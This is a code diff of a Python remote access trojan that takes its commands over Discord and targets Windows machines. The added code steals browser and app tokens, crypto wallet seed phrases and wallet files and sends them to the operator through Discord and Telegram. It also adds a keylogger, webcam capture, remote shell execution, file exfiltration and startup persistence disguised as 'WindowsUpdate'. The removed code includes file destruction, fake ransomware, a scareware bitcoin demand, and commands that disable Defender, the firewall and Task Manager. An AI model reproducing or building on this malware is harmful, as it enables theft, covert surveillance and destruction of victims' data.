+    await send_embed(ctx, "🔍 ULTIMATE GRAB INITIATED", 
+        "Scanning for:\n• ALL Browsers (Chrome, Edge, Brave, Firefox, Opera, Vivaldi)\n• ALL Apps (Discord, Steam, Spotify, Battle.net, Riot, Epic, Minecraft, Roblox, Reddit, TikTok, Telegram, WhatsApp)\n• 🆕 Crypto Wallet Seed Phrases (12/24 word BIP39)\n• 🆕 Wallet Files (Exodus, Atomic, Electrum, Coinomi, Trust, Wasabi, Ledger, Trezor, Guarda, Binance, Jaxx, Coinbase)",
+        discord.Color.blue())
+    
+    results, detected = scan_all_apps()
+    
+    if detected:
+        detected_str = "✅ Detected: " + ", ".join(detected)
+    else:
+        detected_str = "❌ No token-bearing apps detected"
+    
+    if results:
+        output = "\n".join(results[:80])
+        if len(output) > 1900:
+            with open("grab_all.txt", "w", encoding='utf-8') as f:
+                f.write("\n".join(results))
+            await ctx.send(file=discord.File("grab_all.txt"))
+            os.remove("grab_all.txt")
+            embed = discord.Embed(title="📦 All Data Grabbed", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
+            embed.add_field(name="💾 File", value="Downloaded above", inline=True)
+            await ctx.send(embed=embed)
+            
+            # Send via Telegram if configured
+            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+                with open("grab_all.txt", "r", encoding='utf-8') as f:
+                    content = f.read()
+                send_to_telegram(f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{content[:1000]}...")
+        else:
+            embed = discord.Embed(title="📦 All Data Grabbed", description=f"```{output}```", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
+            await ctx.send(embed=embed)
+            
+            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+                send_to_telegram(f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{output[:1000]}")
+    else:
+        embed = discord.Embed(title="📦 No Data Found", color=discord.Color.red())
+        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, Chrome, etc. installed and logged in", inline=False)
+        await ctx.send(embed=embed)
 
-@bot.command(name='rickroll')
-@is_authorized()
-async def rick_roll(ctx):
-    try:
-        subprocess.Popen('start https://www.youtube.com/watch?v=dQw4w9WgXcQ', shell=True)
-        await send_embed(ctx, "Rickroll", "Never gonna give you up", discord.Color.gold())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+# ============================================================
+# TELEGRAM GRAB COMMAND (For Telegram-only mode)
+# ============================================================
 
-@bot.command(name='filescramble')
-@is_authorized()
-async def file_scramble(ctx):
-    try:
-        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
-        scrambled = 0
-        await send_embed(ctx, "Scrambling", "Renaming files...", discord.Color.purple())
-        for folder in folders:
-            folder_path = get_folder_path(folder.lower())
-            if os.path.exists(folder_path):
-                for root, dirs, files in os.walk(folder_path):
-                    for file in files:
-                        try:
-                            old = os.path.join(root, file)
-                            ext = os.path.splitext(file)[1]
-                            new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ext
-                            os.rename(old, os.path.join(root, new_name))
-                            scrambled += 1
-                        except:
-                            pass
-        await send_embed(ctx, "Complete", f"Scrambled {scrambled} files", discord.Color.purple())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+# This function allows grabbing via Telegram if delivery method is Telegram
+# It's called directly from Telegram bot
 
-@bot.command(name='filedestroy')
-@is_authorized()
-async def file_destroy(ctx):
-    try:
-        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
-        deleted = 0
-        await send_embed(ctx, "Destroying", "Deleting files...", discord.Color.dark_red())
-        for folder in folders:
-            folder_path = get_folder_path(folder.lower())
-            if os.path.exists(folder_path):
-                for root, dirs, files in os.walk(folder_path):
-                    for file in files:
-                        try:
-                            os.remove(os.path.join(root, file))
-                            deleted += 1
-                        except:
-                            pass
-        await send_embed(ctx, "Complete", f"Deleted {deleted} files", discord.Color.dark_red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+def telegram_grab():
+    """Grab all data and send via Telegram"""
+    results, detected = scan_all_apps()
+    
+    if detected:
+        detected_str = "✅ Detected: " + ", ".join(detected)
+    else:
+        detected_str = "❌ No token-bearing apps detected"
+    
+    if results:
+        output = "\n".join(results[:80])
+        content = f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{output[:1000]}"
+        send_to_telegram(content)
+        
+        if len(results) > 80:
+            with open("grab_all.txt", "w", encoding='utf-8') as f:
+                f.write("\n".join(results))
+            send_to_telegram("📁 Full results:", "grab_all.txt")
+            os.remove("grab_all.txt")
+    else:
+        send_to_telegram("<b>📦 No Data Found</b>\n\nMake sure target has apps logged in")
 
-@bot.command(name='fileransom')
-@is_authorized()
-async def file_ransom(ctx):
-    try:
-        folders = ['Downloads', 'Documents', 'Pictures', 'Music', 'Videos', 'Desktop']
-        encrypted = 0
-        await send_embed(ctx, "Encrypting", "Ransomware in progress...", discord.Color.dark_purple())
-        for folder in folders:
-            folder_path = get_folder_path(folder.lower())
-            if os.path.exists(folder_path):
-                for root, dirs, files in os.walk(folder_path):
-                    for file in files:
-                        try:
-                            path = os.path.join(root, file)
-                            with open(path, 'rb') as f:
-                                data = base64.b64encode(f.read())
-                            with open(path + '.ENCRYPTED', 'wb') as f:
-                                f.write(data)
-                            os.remove(path)
-                            encrypted += 1
-                        except:
-                            pass
-        await send_embed(ctx, "Complete", f"Encrypted {encrypted} files", discord.Color.dark_purple())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='virus')
-@is_authorized()
-async def virus_message(ctx):
-    try:
-        msg = "WARNING! Virus detected. Pay $5000 in Bitcoin or all files will be deleted."
-        for _ in range(10):
-            subprocess.run(f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{msg}\')"', shell=True)
-        await send_embed(ctx, "Virus Alert", "Displayed fake warnings", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='voice')
-@is_authorized()
-async def voice_message(ctx, *, message: str):
-    try:
-        speak(message)
-        await send_embed(ctx, "Voice", f"Spoke: {message}", discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='msgbox')
-@is_authorized()
-async def msg_box(ctx, *, message: str):
-    try:
-        show_message_box(message)
-        await send_embed(ctx, "Message Box", f"Shown: {message}", discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+# ============================================================
+# ADDITIONAL COMMANDS (Quick Add)
+# ============================================================
 
 @bot.command(name='screenshot')
 @is_authorized()
@@ -1300,70 +1244,97 @@ async def take_screenshot(ctx, name: Optional[str] = None):
             await ctx.send(file=discord.File(f))
         os.remove(filename)
         await send_embed(ctx, "Screenshot", "Captured", discord.Color.green())
+        
+        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+            with open(filename, 'rb') as f:
+                send_to_telegram("📸 Screenshot", filename)
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='open')
+@bot.command(name='webcampic')
 @is_authorized()
-async def open_application(ctx, *, app_name: str):
+async def webcam_pic(ctx):
+    await send_embed(ctx, "Capturing", "Webcam...", discord.Color.blue())
     try:
-        apps = {'notepad': 'notepad.exe', 'calc': 'calc.exe', 'chrome': 'chrome.exe', 'cmd': 'cmd.exe'}
-        subprocess.Popen(apps.get(app_name.lower(), app_name), shell=True)
-        await send_embed(ctx, "Opened", app_name, discord.Color.green())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='close')
-@is_authorized()
-async def close_application(ctx, *, app_name: str):
-    try:
-        for proc in psutil.process_iter(['name']):
-            if app_name.lower() in proc.info['name'].lower():
-                proc.terminate()
-                await send_embed(ctx, "Closed", app_name, discord.Color.green())
-                return
-        await send_embed(ctx, "Not Found", app_name, discord.Color.orange())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='listapps')
-@is_authorized()
-async def list_applications(ctx, limit: int = 15):
-    try:
-        windows = [w for w in gw.getAllTitles() if w]
-        embed = discord.Embed(title="Running Apps", description=f"Showing {min(limit, len(windows))} of {len(windows)}", color=discord.Color.green())
-        for i, w in enumerate(windows[:limit]):
-            embed.add_field(name=f"{i+1}", value=w[:50], inline=False)
-        await ctx.send(embed=embed)
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='click')
-@is_authorized()
-async def mouse_click(ctx, button: str = 'left'):
-    try:
-        b = button.lower()
-        if b == 'left':
-            pyautogui.click()
-        elif b == 'right':
-            pyautogui.rightClick()
-        elif b == 'middle':
-            pyautogui.middleClick()
-        else:
-            await send_embed(ctx, "Invalid", "Use left/right/middle", discord.Color.orange())
+        import cv2
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            await send_embed(ctx, "Webcam", "No camera found", discord.Color.red())
             return
-        await send_embed(ctx, "Clicked", button, discord.Color.blue())
+        ret, frame = cap.read()
+        if ret:
+            path = os.environ['TEMP'] + "\\webcam.jpg"
+            cv2.imwrite(path, frame)
+            cap.release()
+            with open(path, 'rb') as f:
+                await ctx.send(file=discord.File(f))
+            os.remove(path)
+            await send_embed(ctx, "Webcam", "Photo captured", discord.Color.green())
+            
+            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+                with open(path, 'rb') as f:
+                    send_to_telegram("📷 Webcam Photo", path)
+        else:
+            await send_embed(ctx, "Webcam", "Failed to capture", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='press')
+@bot.command(name='keylogstart')
 @is_authorized()
-async def press_key(ctx, *, key_combo: str):
-    try:
-        pyautogui.hotkey(*key_combo.split('+'))
-        await send_embed(ctx, "Keys Pressed", key_combo, discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+async def keylog_start(ctx):
+    global keylog_active
+    if keylog_active:
+        await send_embed(ctx, "Keylog", "Already running", discord.Color.orange())
+        return
+    thread = threading.Thread(target=start_keylog, daemon=True)
+    thread.start()
+    keylog_active = True
+    await send_embed(ctx, "Keylog", "Started", discord.Color.green())
+
+def start_keylog():
+    global keylog_active
+    from pynput import keyboard
+    def on_press(key):
+        if not keylog_active:
+            return False
+        with open(keylog_file, 'a', encoding='utf-8') as f:
+            try:
+                if hasattr(key, 'char') and key.char:
+                    f.write(key.char)
+                elif key == key.space:
+                    f.write(' ')
+                elif key == key.enter:
+                    f.write('\n')
+                else:
+                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
+            except:
+                pass
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    listener.join()
+
+@bot.command(name='keylogstop')
+@is_authorized()
+async def keylog_stop(ctx):
+    global keylog_active
+    keylog_active = False
+    await send_embed(ctx, "Keylog", "Stopped", discord.Color.orange())
+
+@bot.command(name='keylogdump')
+@is_authorized()
+async def keylog_dump(ctx):
+    if os.path.exists(keylog_file):
+        with open(keylog_file, 'r', encoding='utf-8') as f:
+            data = f.read()
+        if len(data) > 1900:
+            await ctx.send(file=discord.File(keylog_file))
+        else:
+            await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
+        
+        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+            send_to_telegram("⌨️ Keylog Dump", keylog_file)
+    else:
+        await send_embed(ctx, "⌨️ Keylog", "No logs found", discord.Color.red())
 
 @bot.command(name='shutdown')
 @is_authorized()
@@ -1391,21 +1362,75 @@ async def restart_pc(ctx, delay: int = 30):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='playpause')
+@bot.command(name='lock')
 @is_authorized()
-async def media_play_pause(ctx):
+async def lock_pc(ctx):
     try:
-        pyautogui.press('playpause')
-        await send_embed(ctx, "Media", "Play/Pause toggled", discord.Color.purple())
+        ctypes.windll.user32.LockWorkStation()
+        await send_embed(ctx, "Locked", "Workstation locked", discord.Color.orange())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='nexttrack')
+@bot.command(name='persistence')
 @is_authorized()
-async def media_next(ctx):
+async def persistence(ctx):
     try:
-        pyautogui.press('nexttrack')
-        await send_embed(ctx, "Media", "Next track", discord.Color.purple())
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
+        winreg.CloseKey(key)
+        await send_embed(ctx, "Persistence", "Added to startup", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='killswitch')
+@is_authorized()
+async def killswitch(ctx):
+    global keylog_active
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(key, "WindowsUpdate")
+        winreg.CloseKey(key)
+    except:
+        pass
+    keylog_active = False
+    if os.path.exists(keylog_file):
+        os.remove(keylog_file)
+    await send_embed(ctx, "Killswitch", "Traces cleaned, exiting", discord.Color.red())
+    sys.exit(0)
+
+@bot.command(name='cmd')
+@is_authorized()
+async def run_cmd(ctx, *, command: str):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout or result.stderr
+        if len(output) > 1900:
+            output = output[:1900] + "..."
+        embed = discord.Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.dark_grey())
+        await ctx.send(embed=embed)
+        
+        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+            send_to_telegram(f"<b>💻 Command: {command}</b>\n\n{output[:1000]}")
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='download')
+@is_authorized()
+async def download_file(ctx, *, filepath: str):
+    try:
+        if not os.path.isabs(filepath):
+            filepath = os.path.join(current_path, filepath)
+        filepath = os.path.normpath(filepath)
+        if os.path.exists(filepath) and os.path.isfile(filepath):
+            if os.path.getsize(filepath) > 104857600:
+                await send_embed(ctx, "Error", "File >100MB (Discord limit)", discord.Color.red())
+                return
+            await ctx.send(file=discord.File(filepath))
+            
+            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+                send_to_telegram(f"📁 Downloaded: {filepath}", filepath)
+        else:
+            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
@@ -1489,1243 +1514,123 @@ async def list_files(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-@bot.command(name='images')
-@is_authorized()
-async def list_images(ctx, directory: str = "."):
-    try:
-        if directory.startswith("~"):
-            directory = os.path.expanduser(directory)
-        if directory == ".":
-            directory = current_path
-        if not os.path.exists(directory):
-            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
-            return
-        if not os.path.isdir(directory):
-            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
-            return
-        
-        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.ico', '.svg'}
-        files = os.listdir(directory)
-        images = []
-        
-        for f in files:
-            path = os.path.join(directory, f)
-            if os.path.isfile(path):
-                ext = os.path.splitext(f)[1].lower()
-                if ext in image_exts:
-                    size = os.path.getsize(path)
-                    if size < 1024:
-                        size_str = f"{size} B"
-                    elif size < 1048576:
-                        size_str = f"{size/1024:.1f} KB"
-                    else:
-                        size_str = f"{size/1048576:.1f} MB"
-                    images.append(f"🖼️ {f} ({size_str})")
-        
-        if not images:
-            await send_embed(ctx, f"📁 {directory}", "No images found", discord.Color.orange())
-            return
-        
-        output = "\n".join(images[:50])
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-        await send_embed(ctx, f"🖼️ Images in {directory}", output, discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='vids')
-@is_authorized()
-async def list_videos_only(ctx, directory: str = "."):
-    try:
-        if directory.startswith("~"):
-            directory = os.path.expanduser(directory)
-        if directory == ".":
-            directory = current_path
-        if not os.path.exists(directory):
-            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
-            return
-        if not os.path.isdir(directory):
-            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
-            return
-        
-        video_exts = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg', '.3gp'}
-        files = os.listdir(directory)
-        videos = []
-        
-        for f in files:
-            path = os.path.join(directory, f)
-            if os.path.isfile(path):
-                ext = os.path.splitext(f)[1].lower()
-                if ext in video_exts:
-                    size = os.path.getsize(path)
-                    if size < 1048576:
-                        size_str = f"{size/1024:.1f} KB"
-                    else:
-                        size_str = f"{size/1048576:.1f} MB"
-                    videos.append(f"🎬 {f} ({size_str})")
-        
-        if not videos:
-            await send_embed(ctx, f"📁 {directory}", "No videos found", discord.Color.orange())
-            return
-        
-        output = "\n".join(videos[:50])
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-        await send_embed(ctx, f"🎬 Videos in {directory}", output, discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='audio')
-@is_authorized()
-async def list_audio_only(ctx, directory: str = "."):
-    try:
-        if directory.startswith("~"):
-            directory = os.path.expanduser(directory)
-        if directory == ".":
-            directory = current_path
-        if not os.path.exists(directory):
-            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
-            return
-        if not os.path.isdir(directory):
-            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
-            return
-        
-        audio_exts = {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus'}
-        files = os.listdir(directory)
-        audio = []
-        
-        for f in files:
-            path = os.path.join(directory, f)
-            if os.path.isfile(path):
-                ext = os.path.splitext(f)[1].lower()
-                if ext in audio_exts:
-                    size = os.path.getsize(path)
-                    if size < 1048576:
-                        size_str = f"{size/1024:.1f} KB"
-                    else:
-                        size_str = f"{size/1048576:.1f} MB"
-                    audio.append(f"🎵 {f} ({size_str})")
-        
-        if not audio:
-            await send_embed(ctx, f"📁 {directory}", "No audio files found", discord.Color.orange())
-            return
-        
-        output = "\n".join(audio[:50])
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-        await send_embed(ctx, f"🎵 Audio in {directory}", output, discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='search')
-@is_authorized()
-async def search_files(ctx, *, query: str):
-    try:
-        results = []
-        for root, dirs, files in os.walk(current_path):
-            for f in files:
-                if query.lower() in f.lower():
-                    path = os.path.join(root, f)
-                    size = os.path.getsize(path)
-                    if size < 1024:
-                        size_str = f"{size} B"
-                    elif size < 1048576:
-                        size_str = f"{size/1024:.1f} KB"
-                    else:
-                        size_str = f"{size/1048576:.1f} MB"
-                    rel_path = os.path.relpath(root, current_path)
-                    if rel_path == '.':
-                        results.append(f"{get_file_emoji(f)} {f} ({size_str})")
-                    else:
-                        results.append(f"{get_file_emoji(f)} {rel_path}\\{f} ({size_str})")
-                    if len(results) >= 30:
-                        break
-            if len(results) >= 30:
-                break
-        
-        if not results:
-            await send_embed(ctx, "🔍 Search Results", f"No files found matching '{query}'", discord.Color.orange())
-            return
-        
-        await send_embed(ctx, f"🔍 Found {len(results)} files", "\n".join(results), discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='recent')
-@is_authorized()
-async def recent_files(ctx, count: int = 15):
-    try:
-        if count > 50:
-            count = 50
-        files = []
-        for f in os.listdir(current_path):
-            path = os.path.join(current_path, f)
-            if os.path.isfile(path):
-                mtime = os.path.getmtime(path)
-                files.append((mtime, f, path))
-        
-        files.sort(reverse=True)
-        results = []
-        for mtime, f, path in files[:count]:
-            size = os.path.getsize(path)
-            if size < 1024:
-                size_str = f"{size} B"
-            elif size < 1048576:
-                size_str = f"{size/1024:.1f} KB"
-            else:
-                size_str = f"{size/1048576:.1f} MB"
-            mod_time = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M')
-            results.append(f"{get_file_emoji(f)} {f} ({size_str}) - {mod_time}")
-        
-        if not results:
-            await send_embed(ctx, "📂 Recent Files", "No files found", discord.Color.orange())
-            return
-        
-        await send_embed(ctx, f"📂 Recent Files ({len(results)})", "\n".join(results), discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='cmd')
-@is_authorized()
-async def run_cmd(ctx, *, command: str):
-    try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        output = result.stdout or result.stderr
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-        embed = discord.Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.dark_grey())
-        await ctx.send(embed=embed)
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='mic')
-@is_authorized()
-async def mic_record(ctx, duration: int = 10):
-    if duration < 3:
-        duration = 3
-    if duration > 60:
-        duration = 60
-    
-    await send_embed(ctx, "🎤 Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
-    
-    try:
-        if AUDIO_AVAILABLE:
-            path = record_mic(duration)
-            if path and os.path.exists(path):
-                with open(path, 'rb') as f:
-                    await ctx.send(file=discord.File(f))
-                os.remove(path)
-                await send_embed(ctx, "✅ Success", "Microphone recording complete", discord.Color.green())
-                return
-        
-        await send_embed(ctx, "⚠️ Recording Unavailable", 
-            "Microphone recording failed. Try these alternatives:\n\n"
-            "• `!camrec` - Record webcam video\n"
-            "• `!webcampic` - Take webcam photo\n"
-            "• `!voice` - Text-to-speech\n\n"
-            "To enable microphone recording, install PyAudio:\n"
-            "`pip install pyaudio`", 
-            discord.Color.orange())
-            
-    except Exception as e:
-        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
-
-@bot.command(name='camrec')
-@is_authorized()
-async def cam_record(ctx, duration: int = 10):
-    if duration < 5:
-        duration = 5
-    if duration > 300:
-        duration = 300
-    
-    await send_embed(ctx, "📷 Webcam Recording", f"Recording for {duration} seconds...", discord.Color.blue())
-    
-    try:
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            await send_embed(ctx, "❌ Error", "No webcam found", discord.Color.red())
-            return
-        
-        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
-        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
-        fps = 20.0
-        
-        fourcc = cv2.VideoWriter_fourcc(*'XVID')
-        output_path = os.environ['TEMP'] + "\\webcam_recording.avi"
-        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
-        
-        start_time = time.time()
-        frame_count = 0
-        
-        while (time.time() - start_time) < duration:
-            ret, frame = cap.read()
-            if not ret:
-                break
-            out.write(frame)
-            frame_count += 1
-            time.sleep(0.05)
-        
-        cap.release()
-        out.release()
-        
-        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
-            with open(output_path, 'rb') as f:
-                await ctx.send(file=discord.File(f))
-            os.remove(output_path)
-            await send_embed(ctx, "✅ Success", f"Webcam recording complete ({frame_count} frames)", discord.Color.green())
-        else:
-            await send_embed(ctx, "❌ Error", "Failed to record webcam", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
-
-@bot.command(name='clipboard')
-@is_authorized()
-async def get_clipboard(ctx):
-    try:
-        win32clipboard.OpenClipboard()
-        data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-        await send_embed(ctx, "Clipboard", f"```{data[:1000]}```", discord.Color.blue())
-    except:
-        await send_embed(ctx, "Clipboard", "No text or access failed", discord.Color.red())
-
-@bot.command(name='geolocate')
-@is_authorized()
-async def geolocate(ctx):
-    try:
-        ip = requests.get('https://api.ipify.org').text
-        r = requests.get(f'http://ip-api.com/json/{ip}')
-        data = r.json()
-        embed = discord.Embed(title="Geolocation", color=discord.Color.green())
-        embed.add_field(name="IP", value=data.get('query', ip))
-        embed.add_field(name="City", value=data.get('city', 'N/A'))
-        embed.add_field(name="Country", value=data.get('country', 'N/A'))
-        embed.add_field(name="ISP", value=data.get('isp', 'N/A'))
-        embed.add_field(name="Map", value=f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}")
-        await ctx.send(embed=embed)
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='website')
-@is_authorized()
-async def open_website(ctx, *, url: str):
-    try:
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        os.startfile(url)
-        await send_embed(ctx, "Website", f"Opened {url}", discord.Color.green())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='disabletaskmgr')
-@is_authorized()
-async def disable_taskmgr(ctx):
-    try:
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(key)
-        await send_embed(ctx, "Task Manager", "Disabled", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='enabletaskmgr')
-@is_authorized()
-async def enable_taskmgr(ctx):
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-        winreg.DeleteValue(key, "DisableTaskMgr")
-        winreg.CloseKey(key)
-        await send_embed(ctx, "Task Manager", "Enabled", discord.Color.green())
-    except:
-        await send_embed(ctx, "Task Manager", "Already enabled", discord.Color.orange())
-
-@bot.command(name='listprocess')
-@is_authorized()
-async def list_process(ctx):
-    try:
-        output = "```\n"
-        for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
-            try:
-                output += f"{proc.info['pid']:6} | {proc.info['name'][:25]:25} | {proc.info['memory_percent']:5.1f}%\n"
-                if len(output) > 1500:
-                    output += "```"
-                    await ctx.send(output)
-                    output = "```\n"
-            except:
-                pass
-        if len(output) > 4:
-            await ctx.send(output + "```")
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='prockill')
-@is_authorized()
-async def proc_kill(ctx, *, name: str):
-    try:
-        for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'].lower() == name.lower():
-                proc.kill()
-                await send_embed(ctx, "Killed", f"{name} (PID: {proc.info['pid']})", discord.Color.red())
-                return
-        await send_embed(ctx, "Not Found", name, discord.Color.orange())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='disabledefender')
-@is_authorized()
-async def disable_defender(ctx):
-    try:
-        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
-        subprocess.run('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True, capture_output=True)
-        await send_embed(ctx, "Defender", "Disabled (reboot may be needed)", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='disablefirewall')
-@is_authorized()
-async def disable_firewall(ctx):
-    try:
-        subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
-        await send_embed(ctx, "Firewall", "Disabled", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='persistence')
-@is_authorized()
-async def persistence(ctx):
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
-        winreg.CloseKey(key)
-        await send_embed(ctx, "Persistence", "Added to startup", discord.Color.green())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='killswitch')
-@is_authorized()
-async def killswitch(ctx):
-    global keylog_active
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.DeleteValue(key, "WindowsUpdate")
-        winreg.CloseKey(key)
-    except:
-        pass
-    keylog_active = False
-    if os.path.exists(keylog_file):
-        os.remove(keylog_file)
-    await send_embed(ctx, "Killswitch", "Traces cleaned, exiting", discord.Color.red())
-    sys.exit(0)
-
-@bot.command(name='keylog')
-@is_authorized()
-async def keylog_cmd(ctx, action: str = None):
-    global keylog_active
-    if action == 'start':
-        if keylog_active:
